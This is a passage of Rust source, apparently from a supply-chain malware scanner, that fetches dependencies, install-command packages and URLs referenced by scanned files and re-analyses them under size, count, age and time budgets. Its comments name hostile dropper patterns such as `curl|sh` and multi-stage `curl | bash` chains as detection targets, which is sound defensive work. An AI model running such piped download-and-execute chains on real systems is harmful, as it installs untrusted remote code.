//! Scan-side orchestration of [`fletch`]: discover the external references in
//! an analysis report, fetch them, and graft each retrieved payload back into
//! the report as a uniform file node — so the ML verdict and every downstream
//! consumer (hopper, prism) treat a fetched payload exactly like any other
//! analyzed file.
//!
//! cleave stays a pure offline analyzer; fletch is a pure find/fetch mechanism.
//! This module is the only place the two meet. For every file (root and archive
//! member) it runs fletch's *facts-based* discovery over the references, values,
//! and symbols cleave retained per file (`FilefactsView`) — declared
//! dependencies, value-driven hunts like npm lifecycle hooks, and module-load
//! calls (`require`/`import`/`__import__`) recovered from the retained AST
//! symbols. For the root sample, where the raw bytes are on disk, it
//! additionally runs the *text-based* hunt (`curl|sh`, `npm install` in a
//! `RUN`). It then retrieves the lot through the SSRF-guarded client and
//! re-analyzes what came back with cleave.
//!
//! The remaining gap: an archive member that is itself a shell script or
//! Dockerfile gets declared/value/symbol-based references only, not the
//! text-based command-stream hunt — that needs the member's bytes, which a
//! prior analysis extracted and discarded. The facts-only import hunt above
//! already covers the module-load vector (a member's `require("undeclared")`)
//! without those bytes.
//!
//! The fetch *edges* (`source_sha256 → content_sha256`) are returned as
//! [`FetchRecord`]s rather than embedded in any file: a fetch is a per-event
//! observation, not an intrinsic property of either file's bytes, so it never
//! falsely dedups when content is exploded by hash in hopper. The caller injects
//! them at report level.
//!
//! Off by default. Enabled, it is an online step performed after the offline
//! analysis; failures degrade gracefully to "no fetches".

use std::collections::{BTreeMap, HashMap, HashSet};
use std::path::Path;
use std::sync::atomic::{AtomicBool, AtomicU32, AtomicU64, AtomicUsize, Ordering};
use std::sync::{Arc, OnceLock, PoisonError, RwLock};
use std::time::{Duration, Instant};

use cleave::{AnalysisOptions, AnalysisReport, Finding};
use fletch::fetch::{
    BlobCache, Fetch, FetchBudget, FetchError, FetchRecord, Fetched, HttpFetch, Method, Outcome,
    RecordedSource, Request, Served, UrlFetches, fetch_ref, fetch_references_with,
};
use fletch::{RefKind, RefLocator, Reference, Registry, find};
use reqwest::Url;

use crate::analysis_cache::AnalysisCache;
use crate::corpus_precheck::{Precheck, Standing, Verdict};
use crate::deptree::{DepState, DepTree};
use crate::hosts::{self, UrlHost};
use crate::output::{Rgb, fg};
use crate::provenance::RegistryProvenance;

#[path = "fetch_pending.rs"]
mod pending;
static PENDING: OnceLock<Arc<pending::Store>> = OnceLock::new();

/// Configure an opt-in durable fetch backlog, rejecting unreadable state.
/// # Errors
/// Returns an error for corrupt, unsupported, or unreadable backlog files.
pub fn configure_pending(path: &Path) -> std::io::Result<()> {
    let store = pending::Store::open(path)?;
    PENDING
        .set(Arc::new(store))
        .map_err(|_store| std::io::Error::other("fetch backlog already configured"))
}

/// Default fetch recursion depth — the number of hops followed from the root.
/// `2` reaches a stage-3 payload (root → stage-2 → stage-3), since multi-stage
/// `curl | bash` droppers are the common case.
pub const DEFAULT_FETCH_DEPTH: u8 = 2;

/// Default age ceiling for fetching a declared dependency, in days. A version
/// older than this has had a long window for community discovery, so only its
/// registry metadata is looked up (a PURL lookup) and the expensive
/// fetch-and-scan is skipped; recent releases — where a supply-chain compromise
/// is freshest and least-vetted — are still pulled and fully scanned. Set to a
/// week: past that, a malicious release has almost always been caught and
/// yanked, and the byte scan's cost isn't worth it. `0` disables the gate.
pub const DEFAULT_MAX_DEP_AGE_DAYS: u32 = 7;

/// Dependency age ceiling for `worker` mode: `0` — no gate, fetch every
/// resolvable dependency.
///
/// An interactive scan gates at [`DEFAULT_MAX_DEP_AGE_DAYS`] because
/// a fresh release is where a supply-chain compromise shows up and the operator is
/// waiting. A worker is the opposite trade: it runs unattended to populate the
/// shared corpus, and every dependency it resolves lands in hopper carrying a
/// package coordinate — the raw material known-good bloom coverage is built from.
/// Gating those out means the cache never learns the long tail that real scans
/// keep re-resolving.
pub const WORKER_MAX_DEP_AGE_DAYS: u32 = 0;

/// The follow selection a `serve` or `worker` process uses when the operator
/// named none: everything, CI actions included.
///
/// These are cache-population roles. They scan on behalf of everybody, and the
/// corpus they fill is asked about artifacts nobody has looked at yet — so a
/// category left unfollowed is one the corpus never learns about, for every
/// consumer, until somebody notices and restarts the fleet with a wider flag.
/// The narrower interactive default exists to keep one person's scan fast,
/// which is not what a service is for.
///
/// Widest-by-default also settles which verdict wins. Hopper holds one verdict
/// per artifact and the last writer takes the row, so a fleet whose members
/// follow different amounts lets a narrow answer overwrite a wide one. When
/// every server follows everything, there is no narrower answer to lose to.
#[must_use]
pub fn default_service_follow_policy() -> FetchPolicy {
    FetchPolicy {
        urls: true,
        packages: true,
        deps: true,
        ci: true,
        ..FetchPolicy::default()
    }
}

/// 1024-based size units, the basis for every `--fetch-max-*-size` ceiling.
const MIB: u64 = 1024 * 1024;
const GIB: u64 = 1024 * MIB;

/// Default size ceiling for a single fetched artifact (`--fetch-max-size`) —
/// mirrors fletch's [`fletch::fetch::DEFAULT_MAX_FETCH_BYTES`] (256 MiB). A
/// response larger than this is abandoned, so one artifact can't dominate a run.
pub const DEFAULT_MAX_FETCH_SIZE: u64 = 256 * MIB;

/// Default ceiling on *live* non-URL fetches triggered by a single scanned file
/// (`--fetch-max-file-fetches`). Cache hits don't count, so a warm re-run is
/// never throttled; this bounds the dependency/package fan-out one crafted file
/// can trigger.
pub const DEFAULT_MAX_FILE_FETCHES: usize = 100;

/// Default ceiling on *live* opportunistic URL fetches triggered by a single
/// scanned file (`--fetch-max-urls`). Cache hits don't count, so a warm re-run
/// is never throttled.
pub const DEFAULT_MAX_URL_FETCHES: usize = 4;

/// Default ceiling on total bytes fetched on behalf of a single scanned file
/// (`--fetch-max-file-size`).
pub const DEFAULT_MAX_FILE_SIZE: u64 = 2 * GIB;

/// Default wall-clock ceiling on one artifact's whole fetch phase
/// (`--fetch-timeout`). The count and byte budgets bound how *much* a scan
/// pulls but not how *long* pulling takes: a wide tree of slow registries can
/// hold a scan open for as long as it likes while every count budget still has
/// room. Five minutes is well past what a healthy tree needs and short enough
/// that a wedged one still returns a verdict. `0` disables the cap.
pub const DEFAULT_FETCH_TIMEOUT: Duration = Duration::from_secs(300);

/// Default ceiling on *live* fetches across one whole execution
/// (`--fetch-max-total-fetches`). Lifted in long-lived server modes, where each
/// job is bounded by the per-file caps instead.
pub const DEFAULT_MAX_TOTAL_FETCHES: usize = 1000;

/// Default ceiling on total bytes fetched across one whole execution
/// (`--fetch-max-total-size`). Lifted in long-lived server modes.
pub const DEFAULT_MAX_TOTAL_SIZE: u64 = 10 * GIB;

/// What the process's fetch client and blob cache are built with.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct Settings {
    /// Ceiling on one fetched response, in bytes (`--fetch-max-size`); a larger
    /// one is abandoned.
    pub max_fetch_bytes: u64,
    /// Replaces both mutable registry-metadata TTLs (`--registry-ttl`). `None`
    /// keeps fletch's tiered defaults; the immutable tier (a released version's
    /// file list) is never re-checked regardless.
    pub registry_ttl: Option<Duration>,
}

impl Default for Settings {
    fn default() -> Self {
        Self {
            max_fetch_bytes: DEFAULT_MAX_FETCH_SIZE,
            registry_ttl: None,
        }
    }
}

static SETTINGS: OnceLock<Settings> = OnceLock::new();

/// Fix the [`Settings`] for the process. Call once at startup, before any
/// fetch: the client and cache are built on first use and keep what they were
/// built with, so a later call is ignored.
pub fn configure(settings: Settings) {
    let _ = SETTINGS.set(settings);
}

fn settings() -> Settings {
    SETTINGS.get().copied().unwrap_or_default()
}

/// fletch's blob cache under the configured [`Settings`]. Everything that reads
/// fetched bytes back opens it here, so it can read whatever a fetch admitted.
///
/// # Errors
/// When there is no OS cache directory.
pub(crate) fn open_blob_cache() -> std::io::Result<BlobCache> {
    let settings = settings();
    Ok(BlobCache::open()?
        .with_max_bytes(settings.max_fetch_bytes)
        .with_registry_ttl(settings.registry_ttl))
}

/// A fetch allowance: live fetches and bytes.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct Allowance {
    fetches: usize,
    bytes: u64,
}

/// The per-execution fetch budget (`--fetch-max-total-*`), shared by every
/// fetch phase in the process. Concurrent scans draw on it, so a fetch reserves
/// its allowance before touching the network and refunds what it did not use:
/// two scans can never both spend the last of it. Left unlimited in long-lived
/// server modes, where each job is bounded by its own per-root budget instead.
#[derive(Debug)]
struct TotalBudget {
    fetches: AtomicUsize,
    bytes: AtomicU64,
}

static TOTAL_BUDGET: TotalBudget = TotalBudget::new(usize::MAX, u64::MAX);

impl TotalBudget {
    const fn new(fetches: usize, bytes: u64) -> Self {
        Self {
            fetches: AtomicUsize::new(fetches),
            bytes: AtomicU64::new(bytes),
        }
    }

    /// Take up to `want` of each, as much as is left. The grant is the
    /// caller's to spend, and to [`Self::settle`] when done.
    fn reserve(&self, want: Allowance) -> Allowance {
        let fetches = self
            .fetches
            .try_update(Ordering::Relaxed, Ordering::Relaxed, |left| {
                Some(left - left.min(want.fetches))
            })
            .unwrap_or_else(|left| left);
        let bytes = self
            .bytes
            .try_update(Ordering::Relaxed, Ordering::Relaxed, |left| {
                Some(left - left.min(want.bytes))
            })
            .unwrap_or_else(|left| left);
        Allowance {
            fetches: fetches.min(want.fetches),
            bytes: bytes.min(want.bytes),
        }
    }

    /// Settle a grant against what was spent: the unused part goes back, and
    /// any overshoot is taken too — fletch's byte cap is best-effort, stopping
    /// only after the fetch that crossed it. The count cap is exact.
    fn settle(&self, granted: Allowance, spent: Allowance) {
        let _ = self
            .fetches
            .try_update(Ordering::Relaxed, Ordering::Relaxed, |left| {
                Some(left.saturating_add(granted.fetches.saturating_sub(spent.fetches)))
            });
        let _ = self
            .bytes
            .try_update(Ordering::Relaxed, Ordering::Relaxed, |left| {
                Some(if spent.bytes <= granted.bytes {
                    left.saturating_add(granted.bytes - spent.bytes)
                } else {
                    left.saturating_sub(spent.bytes - granted.bytes)
                })
            });
    }
}

/// Set the process-wide per-execution fetch ceiling (`--fetch-max-total-*`).
/// Called once at startup for one-shot scans; server modes leave it unlimited.
pub fn set_total_budget(max_fetches: usize, max_bytes: u64) {
    TOTAL_BUDGET.fetches.store(max_fetches, Ordering::Relaxed);
    TOTAL_BUDGET.bytes.store(max_bytes, Ordering::Relaxed);
}

/// What one scanned artifact may still fetch, across all of its hops and
/// declaring files: `--fetch-max-file-fetches` live dependency/package
/// fetches, `--fetch-max-urls` live URL fetches, and `--fetch-max-file-size`
/// bytes. Cache hits are free and uncounted, so a warm re-run is never
/// throttled; references past a cap become `BudgetExceeded`, never silently
/// dropped.
#[derive(Debug, Clone, Copy)]
struct RootBudget {
    deps: usize,
    urls: usize,
    bytes: u64,
}

/// The two fetch classes, each with its own count cap: declared dependencies
/// and command-mentioned packages, and opportunistic raw URLs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum FetchClass {
    Deps,
    Urls,
}

impl RootBudget {
    const fn new(policy: &FetchPolicy) -> Self {
        Self {
            deps: policy.max_file_fetches,
            urls: policy.max_url_fetches,
            bytes: policy.max_file_bytes,
        }
    }

    /// What one fetch of `class` may ask the total budget for.
    const fn want(&self, class: FetchClass) -> Allowance {
        Allowance {
            fetches: match class {
                FetchClass::Deps => self.deps,
                FetchClass::Urls => self.urls,
            },
            bytes: self.bytes,
        }
    }

    fn spend(&mut self, class: FetchClass, spent: Allowance) {
        let fetches = match class {
            FetchClass::Deps => &mut self.deps,
            FetchClass::Urls => &mut self.urls,
        };
        *fetches = fetches.saturating_sub(spent.fetches);
        self.bytes = self.bytes.saturating_sub(spent.bytes);
    }
}

/// Dependency payloads whose analysis has finished, process-wide, whatever the
/// outcome (analyzed, cache hit, corpus skip, nothing to analyze). The worker's
/// stall ticker reads this as a liveness signal: a top-level analysis walking a
/// large transitive closure completes nothing and changes no stage for a long
/// time while making steady progress payload by payload, and without this
/// counter that walk is indistinguishable from a wedged pool.
static PAYLOADS_ANALYZED_TOTAL: AtomicU64 = AtomicU64::new(0);

/// How many dependency payloads have finished analysis in this process.
pub fn payloads_analyzed_total() -> u64 {
    PAYLOADS_ANALYZED_TOTAL.load(Ordering::Relaxed)
}

/// Describe the count budget that can clip one fetch class. The per-file cap
/// is normally the limiting value; a smaller process-wide remainder takes
/// precedence so the notice names the budget that actually stopped the work.
fn fetch_count_budget_notice(
    per_file_flag: &str,
    per_file_limit: usize,
    total_remaining: usize,
) -> String {
    if total_remaining < per_file_limit {
        format!(
            "Skipping remaining fetches, hit fetch budget (--fetch-max-total-fetches={total_remaining})"
        )
    } else {
        format!("Skipping remaining fetches, hit fetch budget ({per_file_flag}={per_file_limit})")
    }
}

/// The live network work in a batch. Cache hits and budget-clipped edges are
/// free of every budget.
fn live_fetch_usage(records: &[FetchRecord]) -> Allowance {
    records
        .iter()
        .filter(|record| record.counts_against_budget())
        .fold(
            Allowance {
                fetches: 0,
                bytes: 0,
            },
            |spent, record| Allowance {
                fetches: spent.fetches + 1,
                bytes: spent.bytes.saturating_add(record.size.unwrap_or(0)),
            },
        )
}

/// Parse a byte size with an optional 1024-based unit suffix — `K`, `M`, `G`, or
/// `T`, case-insensitive, with an optional trailing `B` (`40M`, `40MB`, and
/// `40m` are equal). A bare number is bytes (`10240`). Powers every
/// `--fetch-max-*-size` flag, so an operator writes the natural unit and the
/// conversion happens once.
///
/// # Errors
/// Returns a human-readable message when the number is missing, unparseable, or
/// the result overflows `u64`.
pub fn parse_bytes(s: &str) -> Result<u64, String> {
    let lowered = s.trim().to_ascii_lowercase();
    // Drop an optional trailing `b` so `40mb` == `40m` == `40`, then peel a unit
    // suffix off the number — `strip_suffix` keeps us off byte indexing.
    let body = lowered.strip_suffix('b').unwrap_or(&lowered);
    let units = [('k', 1024_u64), ('m', MIB), ('g', GIB), ('t', 1024 * GIB)];
    let (number, mult) = units
        .iter()
        .find_map(|&(suffix, mult)| body.strip_suffix(suffix).map(|n| (n, mult)))
        .unwrap_or((body, 1));
    let n: u64 = number
        .trim()
        .parse()
        .map_err(|e| format!("invalid size {s:?}: {e} (examples: 40M, 2G, 10240)"))?;
    n.checked_mul(mult)
        .ok_or_else(|| format!("size {s:?} is too large"))
}

/// Parse a duration with an optional unit suffix — `s`, `m`, `h`, or `d`
/// (case-insensitive); a bare number is seconds (`90` == `90s`). The words
/// `never`/`inf`/`forever` mean "cache indefinitely" ([`Duration::MAX`]), for an
/// offline/air-gapped run that must not revalidate. Powers `--registry-ttl`.
///
/// # Errors
/// Returns a human-readable message when the number is missing, unparseable, or
/// the result overflows.
pub fn parse_duration(s: &str) -> Result<Duration, String> {
    let lowered = s.trim().to_ascii_lowercase();
    if matches!(lowered.as_str(), "never" | "inf" | "infinite" | "forever") {
        return Ok(Duration::MAX);
    }
    let units = [('s', 1_u64), ('m', 60), ('h', 3600), ('d', 86_400)];
    let (number, mult) = units
        .iter()
        .find_map(|&(suffix, mult)| lowered.strip_suffix(suffix).map(|n| (n, mult)))
        .unwrap_or((lowered.as_str(), 1));
    let n: u64 = number
        .trim()
        .parse()
        .map_err(|e| format!("invalid duration {s:?}: {e} (examples: 90s, 30m, 4h, 2d, never)"))?;
    n.checked_mul(mult)
        .map(Duration::from_secs)
        .ok_or_else(|| format!("duration {s:?} is too large"))
}

/// Which discovered references to follow, plus how many hops to traverse.
///
/// The public vocabulary groups implementation-level reference kinds by what a
/// caller means: `dependencies` are manifest/lockfile declarations,
/// `references` are packages or URLs named by executable commands, and
/// `ci-actions` are third-party CI actions. The older `deps`, `packages`,
/// `urls`, and `ci` spellings remain CLI aliases.
///
/// The three kinds map onto [`fletch`]'s [`RefKind`] taxonomy, so the selection
/// distinguishes how strongly a reference is bound to the artifact:
///
/// - `deps`     → [`RefKind::Dependency`]: a **strict dependency** declared in a
///   manifest or lockfile (`package.json`, `Cargo.lock`, `.SRCINFO depends`).
/// - `packages` → [`RefKind::Command`]: a **package merely mentioned** by an
///   install-command invocation (`npm install foo`, `pip install bar`,
///   `cargo install baz`) — typically injected by a build/lifecycle script
///   rather than pinned in a manifest.
/// - `urls`     → [`RefKind::UrlFetch`]: a **raw URL** with no package identity
///   (a `curl`/`wget` target, a staged download) — the largest exposure.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct FetchPolicy {
    /// Fetch raw `http(s)` URLs ([`RefKind::UrlFetch`]).
    pub urls: bool,
    /// Fetch packages named by an install command ([`RefKind::Command`]) — e.g.
    /// `npm install foo`. These are *mentioned*, not declared.
    pub packages: bool,
    /// Fetch strict declared dependencies ([`RefKind::Dependency`]) — manifest
    /// and lockfile entries.
    pub deps: bool,
    /// Fetch third-party code declared in a **CI** context — GitHub Actions
    /// `uses:` steps. These are `Dependency`-kind references like any other, but
    /// they run only in CI and never reach an installed artifact, so they are
    /// off by default (a routine `deps` fetch skips them) and enabled only when
    /// auditing CI itself: `--fetch=all`, `--fetch=ci`, or isomer `ci`.
    pub ci: bool,
    /// How many hops to follow: `1` fetches the references found in the root,
    /// `2` also follows references found *inside* those payloads, and so on.
    pub depth: u8,
    /// Skip fetching a declared dependency older than this many days, judged by
    /// the registry's publish date (looked up cheaply before the artifact is
    /// pulled). `0` disables the gate. Applies to declared dependencies only —
    /// URLs and command-mentioned packages are never age-gated, since their risk
    /// isn't tied to a registry release date.
    pub max_dep_age_days: u32,
    /// Ceiling on *live* fetches triggered by a single scanned file
    /// (`--fetch-max-file-fetches`). Cache hits are always served and never
    /// counted, so this caps only the cold-cache dependency/package fan-out,
    /// never a warm re-run. `0` disables these fetches entirely.
    pub max_file_fetches: usize,
    /// Ceiling on *live* opportunistic raw-URL fetches triggered by a single
    /// scanned file (`--fetch-max-urls`). Cache hits are always served and
    /// never counted. `0` disables opportunistic URL fetching while leaving
    /// declared dependencies and command-mentioned packages unaffected.
    pub max_url_fetches: usize,
    /// Wall-clock ceiling on the whole fetch phase for one scanned artifact
    /// (`--fetch-timeout`). Checked at group boundaries, so a group already
    /// downloading finishes rather than being torn mid-transfer; references not
    /// reached by then are simply not followed. [`Duration::ZERO`] disables it.
    pub max_duration: Duration,
    /// Ceiling on total bytes fetched on behalf of a single scanned file
    /// (`--fetch-max-file-size`). The sweep stops once retrieved bytes cross it.
    pub max_file_bytes: u64,
    /// Follow declared dependencies past the **first** hop — the dependencies
    /// of a fetched dependency, and so on to `depth`.
    ///
    /// Off for an interactive scan. Hop 1 is the artifact's own declared supply
    /// chain, which is the thing being judged; hop 2+ is a transitive closure
    /// that multiplies per hop and is dominated by the long tail of ordinary,
    /// old releases. Each of those costs a registry round trip *before* the age
    /// gate can rule it out, because the publish date is what the lookup is for:
    /// one 2.2 KB manifest sidecar pointing at a Go module drew 398 lookups at
    /// hop 2, of which 398 aged out and none was fetched.
    ///
    /// The dropper chain `--fetch-depth 2` exists for runs through URLs and
    /// install-command packages, and those are followed at every hop regardless.
    /// `serve`/`worker` set this because they are cache-population roles, where
    /// the transitive tail is the point rather than an overhead.
    pub transitive_deps: bool,
    /// Skip fetching a *dependency* whose name pins it to a platform other than
    /// the host — the `@scope/pkg-<os>-<arch>` native-binary packages (biome,
    /// esbuild, swc, rollup, sharp…) that ship one prebuilt per platform. On a
    /// darwin-arm64 host only the darwin-arm64 variant is pulled; the linux and
    /// windows siblings cannot run locally. `false` audits every platform,
    /// which service/corpus roles enable because they scan on behalf of others.
    /// Applies to fetched dependencies only; a directly-scanned artifact is
    /// always analyzed.
    pub host_platform_only: bool,
    /// Audit development-only locked dependencies; true preserves full coverage.
    pub include_dev_dependencies: bool,
    /// Analyze every pinned release, preserving separate version constraints.
    pub all_versions: bool,
}

impl Default for FetchPolicy {
    fn default() -> Self {
        Self {
            urls: false,
            packages: false,
            deps: false,
            ci: false,
            depth: DEFAULT_FETCH_DEPTH,
            max_dep_age_days: DEFAULT_MAX_DEP_AGE_DAYS,
            max_file_fetches: DEFAULT_MAX_FILE_FETCHES,
            max_url_fetches: DEFAULT_MAX_URL_FETCHES,
            max_file_bytes: DEFAULT_MAX_FILE_SIZE,
            max_duration: DEFAULT_FETCH_TIMEOUT,
            transitive_deps: false,
            host_platform_only: true,
            include_dev_dependencies: true,
            all_versions: false,
        }
    }
}

impl FetchPolicy {
    /// True when at least one kind is selected — the master switch.
    #[must_use]
    pub(crate) const fn enabled(&self) -> bool {
        self.urls || self.packages || self.deps || self.ci
    }

    /// Parse the customer-facing `follow` vocabulary. Unlike [`FromStr`], this
    /// deliberately rejects the old CLI aliases so the HTTP contract has one
    /// clear spelling for each concept.
    pub(crate) fn parse_follow(value: &str) -> Result<Self, String> {
        Self::parse_selection(value, false)
    }

    /// Copy only the selected reference kinds onto an operator-configured
    /// policy, preserving depth, age, byte, platform, and fan-out ceilings.
    #[must_use]
    pub(crate) const fn with_selection(mut self, selected: Self) -> Self {
        self.urls = selected.urls;
        self.packages = selected.packages;
        self.deps = selected.deps;
        self.ci = selected.ci;
        self
    }

    /// Compact identity for single-flight keys and structured logs.
    #[must_use]
    pub(crate) const fn selection_bits(&self) -> u8 {
        (self.urls as u8)
            | ((self.packages as u8) << 1)
            | ((self.deps as u8) << 2)
            | ((self.ci as u8) << 3)
    }

    /// This selection in the customer-facing `follow` vocabulary, when it has
    /// a name there.
    ///
    /// The inverse of [`Self::parse_follow`], and it exists so a caller never
    /// has to guess which policy produced an answer: whoever files the verdict
    /// files it under the name returned here, and a name that disagreed with
    /// the analysis would file it under the wrong question.
    ///
    /// `None` for a selection the vocabulary cannot spell. `references` moves
    /// `urls` and `packages` together, so the legacy `--follow=urls` alias can
    /// set one without the other and leave a policy with no customer word for
    /// it. Saying nothing is right there: an approximate name is worse than an
    /// absent one, because the absent one falls back to the caller's own
    /// resolution while the approximate one silently misfiles.
    #[must_use]
    pub(crate) fn follow_name(&self) -> Option<String> {
        if self.urls != self.packages {
            return None;
        }
        let references = self.urls;
        if !references && !self.deps && !self.ci {
            return Some("none".to_owned());
        }
        if references && self.deps && self.ci {
            return Some("all".to_owned());
        }
        // Spelled in the order the customer vocabulary lists them, so one
        // policy has exactly one name and a cache keyed by that name does not
        // split on word order.
        let mut parts = Vec::with_capacity(3);
        if self.deps {
            parts.push("dependencies");
        }
        if references {
            parts.push("references");
        }
        if self.ci {
            parts.push("ci-actions");
        }
        Some(parts.join(","))
    }

    fn parse_selection(value: &str, legacy_aliases: bool) -> Result<Self, String> {
        const VALID: &str = "valid: all, dependencies, references, ci-actions, none";
        let mut policy = Self::default();
        let mut saw_kind = false;
        let mut saw_none = false;

        for raw in value.split(',') {
            let kind = raw.trim();
            if kind.is_empty() {
                continue;
            }
            saw_kind = true;
            match kind {
                "none" => saw_none = true,
                "all" => {
                    policy.urls = true;
                    policy.packages = true;
                    policy.deps = true;
                    policy.ci = true;
                }
                "dependencies" => policy.deps = true,
                "references" => {
                    policy.urls = true;
                    policy.packages = true;
                }
                // A CI action is represented as a dependency with CI context,
                // so selecting actions necessarily enables dependency traversal.
                "ci-actions" => {
                    policy.deps = true;
                    policy.ci = true;
                }
                "deps" if legacy_aliases => policy.deps = true,
                "packages" if legacy_aliases => policy.packages = true,
                "urls" if legacy_aliases => policy.urls = true,
                "ci" if legacy_aliases => {
                    policy.deps = true;
                    policy.ci = true;
                }
                other => return Err(format!("unknown follow target {other:?} ({VALID})")),
            }
        }

        if !saw_kind {
            return Err(format!("empty follow selection ({VALID})"));
        }
        if saw_none && policy.enabled() {
            return Err("none cannot be combined with another follow target".to_string());
        }
        if saw_none {
            return Ok(Self::default());
        }
        if !policy.enabled() {
            return Err(format!("empty follow selection ({VALID})"));
        }
        Ok(policy)
    }

    /// Whether `kind` is selected by this policy. References whose kind is
    /// neither a URL, a command-mentioned package, nor a declared dependency
    /// (e.g. [`RefKind::Repository`] identity) are never fetched.
    #[must_use]
    fn wants(&self, kind: RefKind) -> bool {
        match kind {
            RefKind::UrlFetch => self.urls,
            RefKind::Command => self.packages,
            RefKind::Dependency => self.deps,
            _ => false,
        }
    }

    /// Whether `kind` is selected on hop `hop` (0-based). Identical to
    /// [`Self::wants`] except that declared dependencies stop at the first hop
    /// unless [`Self::transitive_deps`] is set — see that field for why.
    #[must_use]
    fn wants_at(&self, kind: RefKind, hop: u8) -> bool {
        self.wants(kind) && (self.transitive_deps || hop == 0 || kind != RefKind::Dependency)
    }
}

impl std::str::FromStr for FetchPolicy {
    type Err = String;

    /// Parse the canonical `follow` vocabulary and the legacy CLI aliases.
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        Self::parse_selection(s, true)
    }
}

/// Canonicalize an OS name segment to its npm token (`process.platform`).
/// Accepts the npm spelling plus the Rust/Go target spellings that appear in
/// cargo platform crates (`windows_x86_64_gnu`) and Go module paths, so a
/// match keys on a genuine `<os>-<arch>` native-binary name rather than an
/// incidental word. `None` for anything that names no OS.
fn canonical_os(seg: &str) -> Option<&'static str> {
    Some(match seg {
        "darwin" | "macos" => "darwin",
        "win32" | "windows" => "win32",
        "sunos" | "solaris" | "illumos" => "sunos",
        "linux" => "linux",
        // musl is its own platform: sharp/libvips ship separate `linuxmusl`
        // prebuilts, and neither libc's binaries load on the other's host.
        "linuxmusl" | "musllinux" => "linuxmusl",
        // StackBlitz-style wasm sandbox builds; never a scan host.
        "webcontainers" | "wasi" => "webcontainers",
        "freebsd" => "freebsd",
        "openbsd" => "openbsd",
        "netbsd" => "netbsd",
        "android" => "android",
        "aix" => "aix",
        _ => return None,
    })
}

/// Canonicalize a CPU-architecture segment to its npm token (`process.arch`).
/// Same vocabulary rule as [`canonical_os`].
fn canonical_arch(seg: &str) -> Option<&'static str> {
    Some(match seg {
        "x64" | "x8664" | "amd64" => "x64",
        "arm64" | "aarch64" => "arm64",
        "ia32" | "i686" | "i386" | "x86" => "ia32",
        "arm" => "arm",
        "ppc64" => "ppc64",
        "s390x" => "s390x",
        "riscv64" => "riscv64",
        "loong64" => "loong64",
        "mips64el" => "mips64el",
        // Wasm sandbox builds pair with an os token (`freebsd-wasm32`,
        // `webcontainers-wasm32`) and never match a real host arch.
        "wasm32" | "wasm64" => "wasm32",
        _ => return None,
    })
}

/// The host's npm-style `(os, arch)` tokens, mapped from Rust's target
/// constants. An unmapped target yields an empty token, which disables that
/// half of the platform match — fail open, so a dependency is never skipped on a
/// host we can't confidently name.
fn host_platform() -> (&'static str, &'static str) {
    let os = match std::env::consts::OS {
        "macos" => "darwin",
        "windows" => "win32",
        "solaris" | "illumos" => "sunos",
        // A musl build (Alpine workers) is its own platform: glibc prebuilts
        // don't load there and musl prebuilts don't load on glibc hosts, and
        // native packages ship separate `linuxmusl` variants (sharp/libvips).
        "linux" if cfg!(target_env = "musl") => "linuxmusl",
        os @ ("linux" | "freebsd" | "openbsd" | "netbsd" | "android") => os,
        _ => "",
    };
    let arch = match std::env::consts::ARCH {
        "x86_64" => "x64",
        "aarch64" => "arm64",
        "x86" => "ia32",
        arch @ ("arm" | "ppc64" | "s390x" | "riscv64") => arch,
        _ => "",
    };
    (os, arch)
}

/// Whether a dependency reference is a native-binary package pinned to a
/// platform other than `host`. Matches the well-known `<os>-<arch>` (or
/// `<arch>-<os>`) adjacent-segment convention native packages use —
/// `cli-darwin-arm64`, `rollup-linux-x64-gnu`, `@img/sharp-win32-x64` — so a
/// package that names no such pair is treated as portable and kept. Returns
/// `false` when the host platform can't be named (fail open) or for non-PURL
/// locators (a raw URL carries no package identity to place).
fn off_host_platform(r: &Reference, host: (&str, &str)) -> bool {
    let (host_os, host_arch) = host;
    if host_os.is_empty() || host_arch.is_empty() {
        return false;
    }
    let RefLocator::Purl(purl) = &r.locator else {
        return false;
    };
    let Some(coordinate) = Coordinate::of(purl) else {
        return false;
    };
    // The package path in lowercase alphanumeric segments
    // (`%40biomejs/cli-darwin-arm64` → [40, biomejs, cli, darwin, arm64]).
    let mut segs: Vec<String> = coordinate
        .path
        .split(|c: char| !c.is_ascii_alphanumeric())
        .filter(|s| !s.is_empty())
        .map(str::to_ascii_lowercase)
        .collect();
    // `x86_64` splits at its underscore; re-join the pair so cargo/Go names
    // (`windows_x86_64_gnu`, `linux_x86_64`) carry one arch token.
    let mut i = 0;
    while i + 1 < segs.len() {
        if segs[i] == "x86" && segs[i + 1] == "64" {
            segs[i] = "x8664".to_string();
            segs.remove(i + 1);
        }
        i += 1;
    }
    // An adjacent os+arch pair (either order) marks a platform-specific package;
    // skip it when either token disagrees with the host.
    for w in segs.windows(2) {
        let (os, arch) = match (canonical_os(&w[0]), canonical_arch(&w[1])) {
            (Some(os), Some(arch)) => (os, arch),
            _ => match (canonical_arch(&w[0]), canonical_os(&w[1])) {
                (Some(arch), Some(os)) => (os, arch),
                _ => continue,
            },
        };
        return os != host_os || arch != host_arch;
    }
    false
}

/// A PURL's coordinate, split once the way every reader in this module needs
/// it: `pkg:<type>/<path>[@<version>]`, qualifiers and subpath dropped. The
/// version follows the last `@` that is not part of the path — a scope's `@` is
/// `%40`-encoded or opens a segment, so it never reads as one. A borrowed view;
/// canonicalization is fletch's job ([`fletch::purl::normalize`]).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct Coordinate<'a> {
    /// `pkg:<type>/<path>`: the package, whatever its version.
    key: &'a str,
    /// The package type (`npm`, `golang`, …).
    typ: &'a str,
    /// The package path after the type, still percent-encoded.
    path: &'a str,
    version: Option<&'a str>,
}

impl<'a> Coordinate<'a> {
    fn of(purl: &'a str) -> Option<Self> {
        let body = purl.strip_prefix("pkg:")?;
        let body = body.split(['?', '#']).next().unwrap_or(body);
        let (typ, rest) = body.split_once('/')?;
        let (path, version) = match rest.rsplit_once('@') {
            Some((path, version)) if !version.contains('/') => (path, Some(version)),
            _ => (rest, None),
        };
        let key = purl.get(.."pkg:".len() + typ.len() + 1 + path.len())?;
        Some(Self {
            key,
            typ,
            path,
            version,
        })
    }
}

/// The root sample's imperative hunt re-reads it from disk and re-parses it.
/// Skip that for large roots — the win is scripts/manifests/Dockerfiles, which
/// are small; a multi-megabyte binary root has no imperative install commands to
